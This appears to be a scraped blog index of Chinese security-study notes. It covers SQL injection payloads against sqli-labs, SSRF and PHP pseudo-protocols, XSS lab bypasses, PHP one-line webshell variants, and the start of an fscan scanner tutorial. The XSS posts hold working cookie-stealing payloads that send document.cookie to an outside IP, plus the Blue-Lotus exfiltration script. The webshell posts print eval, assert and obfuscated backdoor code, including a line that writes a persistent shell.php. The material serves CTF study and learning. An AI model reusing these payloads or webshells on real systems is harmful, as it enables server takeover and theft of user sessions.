http://127.0.0.1/?id=-1 ‘ union select 1,2,3–+\n加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据（将id弄成负数，使前面的语句失效）\n查库名联合查询：select database();\n下面是查看数据库的版本和数据库信息\n假如显示位是3，http://127.0.0.1/?id=-1 ‘ union select 1,version,database()–+\n我们发现名字可能叫users\n查表名找到库名以后，使用http://127.0.0.1/?id=1 ‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’–+ (如果库名是字符型，此处库名要转成十六进制)\n我们发现username和password字段\ninformation_schema:\n这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库\n查列名找到表之后，使用http://127.0.0.1/?id=1 ‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’–+ (如果表名是字符型，此处库名要转成十六进制)\n如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息\n查具体数据\n找到列之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1 ‘ union select 1,2,group_concat(“要查询的数据”) from 表名 –+\n","categories":["sql注入学习"],"tags":["web","sql注入","sqli-labs"]},{"title":"sql靶场第二题思路","url":"/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study2/","content":"判断注入类型数字型注入\nurl为 http://127.0.0.1/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误 \n\nurl为 http://127.0.0.1/?id=1  and 1&#x3D;1时，没有报错\n\nurl为 http://127.0.0.1/?id=1  and 1&#x3D;2时，由于1&#x3D;2不成立，也会报错\n\n\n满足这三个，基本上就是数字注入了\n字符型注入\nurl为 http://127.0.0.1/?id=1&#39;时，数据库认为id叫做1&#39;。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合） \n\nurl为 http://127.0.0.1/?id=1 ‘ and ‘1’&#x3D;’1 在’1’&#x3D;’1之后没有加上’是因为传参时输入的内容已经被’ ‘包围。\n\n\n后台查询列数使用order by试出数据库列数\nurl为 http://127.0.0.1/?id=1 ‘ order by 数字 （如果试4时有错误，3时正确，那么列数为3）\n找显示位使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写\nurl为 http://127.0.0.1/?id=1 ‘ union select 1,2,3\n加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据\n查库名联合查询：select database();\n下面是查看数据库的版本和数据库信息\n假如显示位是3，http://127.0.0.1/?id=1 ‘ union select 1,version,database()\n查表名找到库名以后，使用http://127.0.0.1/?id=1 ‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’ (如果库名是字符型，此处库名要转成十六进制)\ninformation_schema:\n这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库\n查列名找到表之后，使用http://127.0.0.1/?id=1 ‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ (如果表名是字符型，此处库名要转成十六进制)\n如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息\n查具体数据\n找到列之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1 ‘ union select 1,2,group_concat(“要查询的数据”) from 表名\n","categories":["sql注入学习"],"tags":["web","sql注入","sqli-labs"]},{"title":"布尔盲注","url":"/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","content":"布尔盲注（Boolean-based blind injection）是一种常见的SQL注入攻击技术，用于检测和利用Web应用程序中的漏洞。以下是对布尔盲注的详细讲解：\n一、布尔盲注的原理布尔盲注的原理基于布尔逻辑运算的真假判断。当攻击者向目标应用程序发送恶意的输入时，如果应用程序存在漏洞，攻击者可以利用布尔盲注来逐步获取关键信息或执行恶意操作。由于布尔盲注不能通过直接显示的途径来获取数据库数据，攻击者需要观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假，从而推断出关键信息的值。\n二、布尔盲注的利用方式\n判断真假：\n\n攻击者通过发送特定的恶意输入，观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假。\n\n\n逐位判断：\n\n攻击者通常会逐位地检查关键信息的每个字符，比如数据库的表名、列名或数据内容。\n通过构造特定的布尔逻辑语句，攻击者可以利用应用程序的响应，逐位地确定字符的真假。\n\n\n基于推断：\n\n通过观察应用程序的不同响应，攻击者可以推断出关键信息的值。\n例如，攻击者可以通过逐位比较字符的ASCII码范围来获取敏感信息的值。\n\n\n\n三、布尔盲注的常用语句和技巧\n判断查询结果的长度：\n\n使用MySQL的length()函数判断返回结果的长度。\n例如，判断当前数据库名的长度，可以构造如下语句：?id=1&#39; and length(database())=N --（其中N为猜测的长度）。\n\n\n截取和判断字符：\n\n使用substr()函数截取查询结果的第一个字符。\n使用ascii()函数将截取的字符转换成ASCII编码。\n通过构造如下语句，可以判断截取的字符的ASCII码是否等于某个值：?id=1&#39; and ascii(substr(database(),1,1))=M --（其中M为猜测的ASCII码值）。\n\n\n使用自动化工具：\n\n为了简化攻击过程，攻击者可以使用自动化工具，如SQL注入工具包（如sqlmap），来执行布尔盲注攻击。\n这些工具能够自动构造恶意输入，并分析应用程序的响应，以获取关键信息。\n\n\n\n","categories":["sql注入学习"],"tags":["web","sql注入"]},{"title":"sql注入方式(报错注入)","url":"/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","content":"(1). 通过floor报错and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)\n其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符\n(2). 通过updatexml报错and updatexml(1,payload,1)\n同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效\n(3). 通过ExtractValue报错and extractvalue(1, payload)\n输出字符有长度限制，最长32位。 \n","categories":["sql注入学习"],"tags":["web","sql注入"]},{"title":"时间盲注","url":"/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/","content":"时间盲注（Time-based Blind SQL Injection）是SQL注入攻击的一种特殊形式，尤其在Web应用程序不显示任何错误信息或反馈时使用。以下是对时间盲注的详细讲解：\n一、时间盲注的原理时间盲注利用了数据库的延时函数（如MySQL的SLEEP()或BENCHMARK()）来创建可以测量的响应时间差，从而推断出查询的结果。当攻击者发送一个包含延时函数的SQL查询时，如果查询的条件为真，数据库将执行延时操作，导致应用程序的响应时间显著增加。反之，如果查询的条件为假，则不会执行延时操作，应用程序响应迅速。攻击者通过观察和测量不同请求的响应时间，可以判断出数据库的某些信息。\n二、时间盲注的利用方式\n判断是否存在SQL注入漏洞：\n\n攻击者首先尝试在输入字段中添加单引号或其他特殊字符，观察页面响应时间。如果页面响应时间明显变长，则可能存在SQL注入漏洞。\n\n\n获取数据库信息：\n\n攻击者通过输入特定语句（如1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -），观察响应时间，可以判断出数据库类型。\n利用时间盲注的原理，逐步猜测数据库名称、表名称、列名称等信息。例如，要获取数据库名称，可以尝试输入类似1&#39; AND IF(SUBSTRING(DATABASE(),1,1)=&#39;s&#39;,SLEEP(5),0)-- -的语句。\n\n\n使用自动化工具：\n\n为了提高攻击效率，攻击者可能会使用自动化工具（如Burp Suite、sqlmap等）进行半自动化或自动化注入。\n这些工具能够自动构造恶意输入，并分析应用程序的响应时间，以获取关键信息。\n\n\n\n四、时间盲注的案例分析假设有一个存在SQL注入漏洞的Web应用程序，攻击者可以通过以下步骤利用时间盲注获取数据库信息：\n\n判断是否存在SQL注入漏洞：\n\n攻击者在输入字段中输入1&#39; AND SLEEP(5)-- -，观察页面响应时间。如果响应时间显著增加（如5秒），则表明存在SQL注入漏洞。\n\n\n获取数据库版本信息：\n\n攻击者输入1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -，如果响应时间增加，则表明数据库版本的第一个字符是’5’。通过不断调整猜测的字符，攻击者可以逐步获取完整的数据库版本信息。\n\n\n获取数据库名称：\n\n攻击者使用类似的语句逐步猜测数据库名称的每个字符，直到获取完整的数据库名称。\n\n\n获取表名称和列名称：\n\n攻击者可以继续使用时间盲注的方法获取数据库中的表名称和列名称。\n\n\n获取数据：\n\n一旦获取了表名称和列名称，攻击者就可以构造恶意的SQL查询语句来获取表中的数据。\n\n\n\n","tags":["web","sqli-labs"]},{"title":"联合注入","url":"/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/","content":"SQL UNION注入是一种攻击技术，攻击者通过构造恶意的输入，利用UNION操作符添加额外的查询部分，将其他原本不应出现在当前查询中的数据合并到结果集中，从而达到获取敏感数据或执行未授权操作的目的。以下是对SQL UNION注入的详细讲解：\n一、UNION查询的特性UNION联合查询的作用是把多个表中的数据联合在一起进行显示。使用UNION查询时，需要注意以下几点：\n\n使用UNION查询的SELECT语句必须拥有相同数量的字段，同时每条SELECT语句中的字段顺序必须相同。\nUNION操作符默认去除重复的记录，如果需要保留所有记录（包括重复的记录），可以使用UNION ALL。\n\n二、UNION注入的原理当应用程序在构建SQL查询时，如果将用户输入未经充分验证和清理就直接拼接到查询语句中，就可能存在SQL注入漏洞。攻击者可以利用这一漏洞，通过构造恶意的输入，利用UNION操作符添加额外的查询部分，从而将其他数据合并到结果集中。\n例如，原始的SQL查询可能是：\nSELECT column1, column2 FROM table1 WHERE condition = &#x27;$user_input&#x27;;\n\n如果应用程序没有对用户输入$user_input进行严格过滤和验证，攻击者可以输入类似以下的恶意内容：\n&#x27; UNION SELECT sensitive_column1, sensitive_column2 FROM sensitive_table --\n\n这样，数据库会将攻击者构造的新查询与原始查询通过UNION连接起来执行，从而将原本受保护的敏感数据从sensitive_table表中提取出来并显示在结果集中。\n三、UNION注入的利用流程\n确定输入点：找到可以输入数据并且该数据会被直接拼接到SQL查询中的地方。\n确定字段数量：通过尝试不同数量的列，观察服务器的响应，以确定原始查询中选择的字段数量，以便在注入的UNION查询中提供相同数量的列。\n确定数据类型：了解每个列所期望的数据类型，以便构造合法的注入查询。\n\n一旦这些前置条件确定，攻击者就可以构造恶意的UNION查询来执行未授权的数据库操作。\n四、UNION注入的示例假设有一个存在SQL注入漏洞的Web应用程序，其后台SQL查询语句如下：\nSELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;\n\n攻击者可以在$id参数中注入恶意的SQL代码，例如：\n1&#x27; union select user(),database()#\n\n这样，构造的SQL查询语句将变为：\nSELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select user(),database()#&#x27;;\n\n执行这条查询语句后，攻击者可以获得当前数据库的用户名和数据库名等敏感信息。\n","categories":["sql注入学习"],"tags":["web","sql注入"]},{"title":"常见的php伪协议","url":"/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","content":"1. file:&#x2F;&#x2F; 协议概述：file:// 是一种用于访问本地文件系统的协议。在 URL 中，它指示访问本地计算机的文件。例如：\n\nfile:///etc/passwd（Linux系统中）\nfile:///C:/Windows/System32/drivers/etc/hosts（Windows系统中）\n\n它是一个用于本地文件的 URI 协议，表示在本地计算机上读取文件的路径。\n常见用途：\n文件访问：它允许直接访问本地文件系统中的文件。这个协议通常用于 Web 浏览器中查看本地文件。\n浏览器功能：某些浏览器允许用户输入 file:// URL 来查看本地文件，而不通过HTTP或FTP。\n\n攻击场景：如果 Web 应用没有正确验证和过滤用户输入，攻击者可能构造类似于 file:// 的路径来访问本地敏感文件。典型攻击案例包括：\n\n读取敏感文件：攻击者可以提交类似 file:///etc/passwd（Linux）或 file:///C:/Windows/System32/config/systemprofile（Windows）这样的路径来读取本地敏感文件。\nSSRF（Server-Side Request Forgery）攻击：攻击者通过利用 SSRF 漏洞，将服务器请求引导到本地文件系统，读取服务器上的敏感数据，如 /etc/shadow、数据库配置文件等。\n\n\n2. dict:&#x2F;&#x2F; 协议概述：dict:// 协议用于连接到 Dictionary Protocol 服务。字典协议（DICT）是一种用于访问在线字典的协议，它允许客户端通过互联网查询词汇定义。dict:// 协议的 URL 通常用于指示一个字典服务器和要查询的词条。例如：\ndict://dict.org/merriam-webster/word\n\n此 URL 会请求连接到 dict.org 的字典服务，并查询 merriam-webster 词条下的 word 内容。\n常见用途：\n字典查询：用户可以通过 dict:// 协议访问各种公共或私人的字典服务器，获取词汇和术语的定义。\n教育和参考：这种协议可以用于访问科学、技术和文学领域的专业词汇。\n\n攻击场景：虽然 dict:// 协议本身并不会直接引发严重的安全问题，但如果 Web 应用错误地处理它，可能会导致一些间接的攻击机会。例如：\n\nSSR攻击：攻击者如果能够控制 Web 应用输入的 URL，可能诱使应用通过 dict:// 协议访问敏感内网资源（比如某些内部字典服务或数据库），从而泄露数据。\n暴露内部字典服务：某些应用可能通过 dict:// 协议连接到内部的字典服务，如果攻击者可以操控输入，可能会导致未授权的服务访问，进而泄露信息。\n\n\n3. gopher:&#x2F;&#x2F; 协议概述：gopher:// 协议源自早期的互联网协议 Gopher，它是一种用于信息检索的协议，允许用户通过结构化的层次目录访问信息。虽然 Gopher 协议已经过时，但仍然存在一些遗留的 Gopher 服务器，供用户访问文件、文档等信息。\n例如：\ngopher://gopher.floodgap.com/1/0/1/textfile.txt\n\n这将连接到一个 Gopher 服务器，下载 textfile.txt 文件。\n常见用途：\n信息检索：Gopher 协议原本用于提供结构化的文本和信息检索，类似于早期的网络搜索引擎。\n教育和档案：一些旧的 Gopher 服务仍然在使用，用于存档资料或作为怀旧用途。\n\n攻击场景：与 file:// 和 dict:// 协议相比，gopher:// 协议的安全问题更加隐蔽，可能会被错误地使用或滥用。攻击者可以利用 SSRF 漏洞通过 gopher:// 协议发起请求，尝试访问内网服务或获取信息。例如：\n\n内部服务扫描：攻击者可以通过 Gopher 协议扫描目标 Web 应用所在网络中的内网服务。例如，可以利用 gopher://127.0.0.1:8000 来访问内网服务。\n信息泄露：攻击者可能通过 Gopher 协议访问目标服务器的未授权端口，泄露敏感的内部信息。\n\n\n","categories":["SSRF"],"tags":["web","php伪协议"]},{"title":"SSRF简介","url":"/2025/01/02/web/ssrf/%E7%AE%80%E4%BB%8B/","content":"SSRF（Server-Side Request Forgery，服务器端请求伪造）的原理SSRF（服务器端请求伪造）是一种攻击技术，攻击者通过操控一个Web应用发起伪造的请求，从而欺骗目标服务器，导致服务器向攻击者指定的地址（可能是外部服务器，也可能是内网地址）发起请求。这类攻击利用了服务器本身的网络访问权限，通常可以绕过防火墙和网络隔离，访问原本无法访问的资源，进而引发数据泄露、系统入侵等安全问题。\nSSRF的关键在于通过操控Web应用的请求机制来访问原本不可访问的服务。攻击者并不直接与目标服务器交互，而是通过漏洞利用Web服务器发起恶意请求。\nSSRF攻击的工作流程\n攻击者输入恶意数据：攻击者通过Web应用的输入点提交恶意URL或地址。这些输入点通常是用户可以控制的字段，如Web表单、URL参数、文件上传等。\n\nWeb应用发起请求：Web应用将攻击者提交的恶意输入当作目标URL或地址，并通过后端代码（如HTTP请求库）发起请求。此时，Web应用扮演了请求发起者的角色，攻击者的恶意请求通过Web服务器发起。\n\n恶意请求触发访问：根据攻击者提供的恶意URL或地址，Web应用可能会访问内部资源（如内网的API、管理接口或数据库服务）或者外部资源（如攻击者控制的恶意网站）。\n\n返回的响应被利用：如果Web应用未正确处理这些请求，攻击者可能通过返回的数据进行进一步的攻击，例如泄露敏感信息、获取内网服务的返回数据、进行端口扫描等。\n\n利用网络环境漏洞：通过SSRF，攻击者可以利用目标服务器的内网权限绕过防火墙、网络隔离等安全策略，访问本不应该暴露的服务和数据。\n\n\n\nSSRF的攻击场景SSRF攻击通常发生在以下几种场景中：\n\nURL输入漏洞用户通过Web应用提交一个URL，Web应用会尝试访问这个URL，常见的例子包括：\n\n允许用户提交URL的文件下载功能\n允许用户输入URL并在Web页面中显示其内容\n通过URL查询外部API或获取资源\n\n\n文件上传漏洞Web应用可能允许用户上传文件，并对上传的文件进行处理。如果Web应用在文件上传时需要根据上传内容的URL进行请求，攻击者可以上传带有恶意URL的文件（如包含http://localhost/admin的图片或其他格式的文件）。\n\nHTTP请求头恶意伪造一些应用会根据请求头的内容（如X-Forwarded-For、Host等）发起请求。攻击者可以伪造这些头信息，诱使Web应用访问内网服务。\n\n其他网络请求功能Web应用可能有其他类型的网络请求功能，如发送HTTP请求以获取数据，或在后台进行Web抓取。攻击者可以通过伪造请求的目标来控制访问内网或外部资源。\n\n\n\nSSRF攻击的常见利用方法\n内网服务扫描通过SSRF，攻击者可以扫描目标Web服务器所在的内网，发现本来应该无法访问的内网服务。例如，通过访问http://localhost:8080，攻击者可以访问目标服务器的本地管理接口、数据库服务等。\n\n信息泄漏SSRF攻击可能导致内部资源的泄漏。例如，攻击者可以通过访问http://localhost:9200来扫描和获取Elasticsearch数据库的敏感信息，或通过访问http://127.0.0.1:5000获取内网API的返回数据。\n\n端口扫描攻击者可以通过控制请求目标地址和端口进行端口扫描，识别目标服务器所在内网的开放端口。例如，攻击者可以利用SSRF通过请求http://localhost:1-65535来扫描目标服务器所有的端口。\n\n服务绕过有些Web应用配置了IP白名单或防火墙，阻止来自外部的直接访问。攻击者可以通过SSR攻击发起来自Web应用服务器的请求，从而绕过这些安全机制。\n\n利用内网API或管理面板Web服务器可能会访问内部的管理系统、API或其他受保护的资源。攻击者通过SSRF访问这些资源，可能会获取敏感数据、执行管理命令或修改系统设置。\n\n\n\nSSRF攻击的例子例子1：URL作为参数假设有一个Web应用，它允许用户输入一个URL并返回该URL指向的资源。攻击者可以提交恶意的URL，如：\nhttp://localhost/admin\n\nWeb应用会尝试从localhost请求该资源，而实际上localhost是Web服务器的内部地址，可能会导致访问敏感的管理接口，泄露后台管理页面。\n例子2：文件上传假设某个Web应用允许用户上传图片，攻击者上传一个图片文件，并在图片的元数据中嵌入恶意的URL（如http://127.0.0.1:8080/api）。当应用处理文件时，它会访问该URL，从而使攻击者能够访问内网资源。\n\n防御SSRF的策略\n限制服务器请求的目标范围在Web应用服务器中，使用防火墙或网络访问控制列表（ACL）来限制请求的目标范围，禁止访问localhost、127.0.0.1、内网IP地址（如192.168.x.x、10.x.x.x）等。\n\n严格校验输入的URL对用户输入的URL进行严格校验，防止请求内网资源。可以通过正则表达式、白名单等方式限制允许的域名和IP地址。拒绝掉本地地址（如localhost、127.0.0.1等）和不可访问的IP段。\n\n限制HTTP请求头在HTTP请求中，某些头信息（如X-Forwarded-For、Host、Referer）可以被恶意伪造。要确保对这些头信息进行严格校验，防止攻击者通过伪造请求头进行绕过。\n\n使用请求代理在发起外部请求时，使用请求代理来控制外部请求的来源，减少Web服务器直接发起恶意请求的风险。\n\n输出过滤和响应校验对返回的内容进行适当的过滤和检查，确保不泄露内部敏感信息。例如，不应将堆栈信息、错误信息等直接返回给用户。\n\n日志审计对Web服务器的请求进行详细日志记录，尤其是外部请求。审计异常请求、未授权访问等，帮助发现潜在的SSRF攻击行为。\n\n\n\n","categories":["SSRF"],"tags":["web"]},{"title":"upload","url":"/2025/03/19/web/upload/upload/","content":"有时间再写","categories":["upload"],"tags":["web","upload"]},{"title":"xss-lab","url":"/2025/03/19/web/xss/xss-lab/","content":"1没有过滤\n&lt;script&gt;alert()&lt;/script&gt;\n\n2代码插入””里面\n&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;\n\n3代码插入到’’里面而且将符号实体化了\n{onfocus事件在元素获得焦点时触发，最常与 、 和  标签一起使用，以上面图片的html标签为例，标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码}\n&#x27; onfocus=javascript:alert() &#x27;\n\n4&quot;&gt; onfocus=javascript:alert() &lt;&quot;\n\n5onfocus似掉了换一个姿势\n&quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;&lt;&quot;\n\n6a href也寄掉了，但是没有过滤大小写\n&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;\n\n7判断检测到上面的就会自动删除该单词\n&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;&lt;&quot;\n\n8javascript:alert(“xss”)发现不可以用，&#x2F;&#x2F;注释也不可以用考虑用unioncode编码之后绕过\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;\n\n9在8题基础上面添加了检查有没有http:&#x2F;&#x2F;\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;//http://\n\n10研究ing\n","categories":["XSS"],"tags":["web"]},{"title":"xss","url":"/2025/03/19/web/xss/xss/","content":"常见的姿势&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=javascript:alert(1)&gt;xxx&lt;/a&gt; //添加标签，但是必须要点击标签才有效&lt;img src=1 onerror=alert(1)&gt;&lt;image src=1 onerror=alert(1)&gt;&lt;body onload=alert(1)&gt; // 在页面加载完成后执行onload指定的函数&lt;svg onload=alert(1)&gt; // 在SVG图像加载完成后执行onload指定的函数&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt; // &lt;iframe&gt;标签是用于在网页中嵌入其他网页或文档的元素，onload事件是在&lt;iframe&gt;加载完成后触发的事件。&lt;body onload=&quot;windows.open(&#x27;https://www.baidu.com&#x27;)&quot;&gt; // 加载百度页面&lt;body onload=&#x27;console.log(1)&#x27;&gt; // 控制台打印1&lt;body onload=&#x27;console.info(1)&#x27;&gt;&lt;body onload=&#x27;console.error(1)&#x27;&gt;onfocus=javascript:alert()绕过方法过滤空格，用/、Tab(%09)或者/**/代替空格，如&lt;body/onload=alert(1)&gt;过滤alert，用top[&#x27;aler&#x27;+&#x27;t&#x27;]绕过过滤 alert()，用top[&#x27;aler&#x27;+&#x27;t&#x27;].call 绕过\n\n\n\n\nweb316没有一点过滤\n&lt;script src=&quot;http://47.115.221.235:1234/myjs/niuniu.js&quot;&gt;&lt;/script&gt;\n这是蓝莲花Blue-Lotus自带的脚本\nvar website=&quot;http://47.115.221.235:1234/index.php&quot;;(function()&#123;(new Image()).src=website+&#x27;/?keepsession=1&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();\n不会的喵\nweb317过滤了script我们考虑img标签\n&lt;img src=&quot;&quot; onerror=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;\n\nweb318-319又过滤了img我们考虑body\n&lt;body onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;\n\nweb320-326过滤了空格\n&lt;body/onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;\n","categories":["XSS"],"tags":["web","ctfshow"]},{"title":"一句话木马上","url":"/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC1/","content":"一句话木马是一种短小精悍的恶意代码，通常只有一行代码，但其功能却相当强大，能够利用一些漏洞，以上传文件、修改配置等方式将恶意代码植入到受害者服务器上，并通过特殊手法在服务器端执行，以达到入侵控制目的。以下是对一句话木马的详细讲解：\n一、一句话木马的工作原理一句话木马的工作原理主要基于代码注入和远程命令执行。攻击者通过在目标服务器上植入一句话木马，可以接收来自远程客户端的控制命令，并在服务器上执行这些命令。这些命令可以包括文件上传、下载、执行系统命令、读取数据库信息等。\n具体来说，一句话木马通常包含以下几个部分：\n\n接收数据：通过特定的函数（如$_POST、$_GET等）接收来自远程客户端的数据。\n执行命令：使用某些函数（如eval()、assert()、preg_replace()等）执行接收到的数据中的命令。\n\n例如，一个典型的一句话木马可能看起来像这样：\n&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;\n\n在这个例子中，eval()函数用于执行$_POST[&#39;cmd&#39;]中的PHP代码。攻击者可以通过向这个页面发送POST请求，并在请求中包含cmd参数来执行任意的PHP代码。\n二、一句话木马的变形与隐蔽性为了绕过安全检测和提高隐蔽性，一句话木马出现了多种变形。这些变形可能包括使用不同的函数、编码方式、混淆技术等。例如：\n\n使用不同的函数：除了eval()之外，攻击者还可以使用assert()、create_function()等函数来执行命令。\n编码与混淆：通过对一句话木马进行编码或混淆处理，可以使其更加难以被检测和识别。例如，可以使用Base64编码、URL编码等方式对代码进行编码处理。\n隐藏在图片中：攻击者还可以将一句话木马隐藏在图片文件中，并通过特定的方式将其解析为PHP代码执行。这种技术被称为“图片马”。\n\n","categories":["一句话木马"],"tags":["web"]},{"title":"一句话木马下","url":"/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC2/","content":"一、利用不同函数\nassert()函数：\n\n写法：&lt;?php assert($_POST[&#39;cmd&#39;]); ?&gt;\n分析：assert()函数同样可以执行PHP代码，但不易被标记为恶意代码，因此常被用于一句话木马的变形中。\n\n\ncreate_function()函数：\n\n写法：&lt;?php $fun=create_function(&#39;&#39;,$_POST[&#39;a&#39;]);$fun(); ?&gt;\n分析：create_function()函数可以动态创建一个匿名函数，并执行其中的代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。\n\n\ncall_user_func()函数：\n\n写法：&lt;?php @call_user_func(assert,$_POST[&#39;a&#39;]); ?&gt;\n分析：call_user_func()函数可以调用一个指定的函数，并传递参数。在这里，它被用来调用assert()函数并执行恶意代码。\n\n\n\n二、混淆技术\n字符串拼接：\n\n写法：&lt;?php $&#123;&#39;_&#39;.&#39;P&#39;.&#39;O&#39;.&#39;S&#39;.&#39;T&#39;&#125;[&#39;cmd&#39;]=&quot;系统命令&quot;; ?&gt;\n分析：通过将字符逐个拼接成函数名或变量名，可以绕过一些简单的字符串匹配检测。\n\n\n变量替换：\n\n写法：&lt;?php $a=&quot;assert&quot;;$a(@$_POST[&#39;a&#39;]); ?&gt;\n分析：通过变量替换，将恶意函数名存储在变量中，再调用该变量执行恶意代码。\n\n\n\n三、加密与自解密\nBase64编码：\n\n写法：&lt;?php eval(base64_decode(&quot;ZWNobyBoZWxsbyB3b3JsZA==&quot;)); ?&gt;\n分析：使用Base64编码对恶意代码进行加密，然后在执行时再进行解码。这种技术可以绕过一些基于字符串匹配的检测。\n\n\n其他加密方式：\n\n除了Base64编码外，还可以使用其他加密方式（如AES、RSA等）对恶意代码进行加密。但需要注意的是，加密后的代码需要在服务器端进行解密和执行，因此可能会增加服务器的负担和暴露更多的攻击面。\n\n\n\n四、高级变形\n利用正则函数执行代码：\n\n写法：&lt;?php preg_replace(&#39;/.*/e&#39;,$_POST[&#39;cmd&#39;],&#39;&#39;); ?&gt;\n分析：在某些环境下，preg_replace()函数可以使用/e修饰符来执行替换代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。但需要注意的是，这种方式在PHP新版本中已被废弃或限制使用。\n\n\n动态写入语句：\n\n写法：&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;); ?&gt;\n分析：通过动态写入语句的方式，在服务器上创建一个新的PHP文件，并在其中包含一句话木马。这样即使原始的一句话木马被删除或修改，攻击者仍然可以通过新创建的文件继续控制服务器。\n\n\n\n","categories":["一句话木马"],"tags":["web"]},{"title":"fscan内网扫描工具详解","url":"/2025/04/05/web/%E6%B8%97%E9%80%8F/fscan/","content":"1. fscan工具简介fscan是一款开源的内网综合扫描工具，由Shadow Security Team开发，主要用于内网渗透的快速信息收集。该工具集成了端口扫描、服务识别、各类常见漏洞检测、弱口令检测等多种功能，支持多平台运行，是内网渗透测试中的得力助手。\n主要特点\n多协议端口扫描\n自动服务识别\n常见漏洞检测\n各类服务的弱口令爆破\n支持主机发现\n支持多种输出格式\n单文件、跨平台、无依赖\n\n2. 安装与获取2.1 获取方式从GitHub下载最新版本：\n# 克隆仓库git clone https://github.com/shadow1ng/fscan.git# 或直接下载编译好的二进制文件# 访问 https://github.com/shadow1ng/fscan/releases\n\n2.2 支持平台fscan支持多种操作系统平台：\n\nWindows (32位&#x2F;64位)\nLinux (32位&#x2F;64位)\nMacOS\n\n3. 基本使用方法3.1 命令行参数# 基本扫描语法./fscan -h 目标IP/子网# 常用参数./fscan -h 192.168.1.1/24 -p 1-65535    # 完整端口扫描./fscan -h 192.168.1.1/24 -p 